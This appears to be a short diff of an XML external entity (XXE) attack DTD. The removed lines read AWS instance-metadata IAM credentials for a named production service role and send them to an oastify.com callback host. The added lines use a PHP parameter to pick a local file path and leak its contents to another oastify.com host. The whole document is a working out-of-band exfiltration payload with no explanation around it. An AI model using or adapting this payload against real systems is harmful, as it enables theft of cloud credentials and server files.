@@ -1,4 +1,8 @@
-<!ENTITY % file SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/epps-prod-ratesheets-iam-servicerole-us-west-2">
-<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://ymofz6jkk1tvca73ftxsvu4joau1is6h.oastify.com/?xxe=%file;'>">
-%eval;
-%exfiltrate;
+<?php
+$dir = $_GET['dir'];
+?>
+
+<!ENTITY % file SYSTEM "file:///<?php echo $dir;?>">
+<!ENTITY % ext "<!ENTITY &#x25; exfil SYSTEM '87dpkg4u5be5xksd03i2g4pt9kfb33rs.oastify.com/?xxe=%file;'>">
+%ext;
+%exfil;
